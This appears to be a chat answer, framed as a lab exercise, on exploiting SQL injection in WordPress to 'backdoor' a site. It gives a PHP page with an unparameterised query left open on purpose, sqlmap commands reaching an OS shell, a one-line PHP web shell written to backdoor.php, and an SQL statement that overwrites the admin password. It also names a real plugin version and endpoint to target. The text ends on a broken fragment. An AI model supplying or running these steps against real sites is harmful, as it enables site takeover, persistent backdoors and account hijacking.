In WordPress, the "standard" way a vulnerability like this is introduced is through a custom plugin or a theme that bypasses the built-in $wpdb->prepare() function.

To create a scenario where you can "backdoor" the site via SQLi, you would need a script that allows you to execute stacked queries or use INTO OUTFILE to drop a shell. Note that modern mysqli and wpdb often prevent multiple statements by default, but a vulnerability can still allow you to create an admin user directly via the database.
💉 The "Backdoor-able" WordPress Page

Create a file named wp-debug-tool.php and place it in your WordPress root or a plugin folder. This script simulates a "user lookup" tool that is common in custom-built management plugins.
PHP

<?php
/**
 * LAB ONLY: Vulnerable User Lookup
 * This script is intentionally insecure for SQLmap testing.
 */
require_once('wp-load.php'); // Load WordPress environment

global $wpdb;

// VULNERABLE: Direct concatenation without $wpdb->prepare()
// This allows an attacker to manipulate the query to create a new admin.
$user_id = $_GET['debug_id']; 

$results = $wpdb->get_results("SELECT user_login, user_email FROM {$wpdb->prefix}users WHERE ID = " . $user_id);

if ($results) {
    foreach ($results as $user) {
        echo "Login: " . $user->user_login . " | Email: " . $user->user_email . "<br>";
    }
} else {
    echo "No user found.";
}

🔓 How to "Backdoor" via this Bug

Since you have a SQL injection in a SELECT statement, you can use sqlmap to perform a "backdoor" by creating a new administrator account directly in the database.

Step 1: Identify the vulnerability with sqlmap
Bash

sqlmap -u "http://localhost:8080/wp-debug-tool.php?debug_id=1" --dbs

Step 2: Use the SQLi to insert a new Admin User
You can use sqlmap --sql-query to execute an INSERT statement (if the database user has permissions) or use a complex UNION attack. However, the most effective "backdoor" method with sqlmap is:
Bash

# Attempt to get a full OS shell if the DB user has FILE privileges
sqlmap -u "http://localhost:8080/wp-debug-tool.php?debug_id=1" --os-shell

If --os-shell works: You can now run echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/backdoor.php and you have a persistent web shell.
🕵️‍♂️ Realistic 2026 Target: CVE-2026-2413

If you want to test against a real-world 2026 vulnerability rather than a custom script, look at CVE-2026-2413 in the "Ally – Web Accessibility" plugin.

    The Bug: It concatenates a user-supplied URL into a JOIN clause.

    The Impact: Unauthenticated time-based blind SQLi.

    Lab Setup: Install Ally version 4.0.3 and target the get_global_remediations() endpoint.

🧪 Lab Challenge

Once you have sqlmap identifying the bug in your wp-debug-tool.php, try to use the --sql-shell flag to manually run an UPDATE command to change the admin's password:
SQL

UPDATE wp_users SET user_pass = MD5('new_password') WHERE ID = 1;

in the end of the day this website is extrmly vulnerable becuase of this but , 

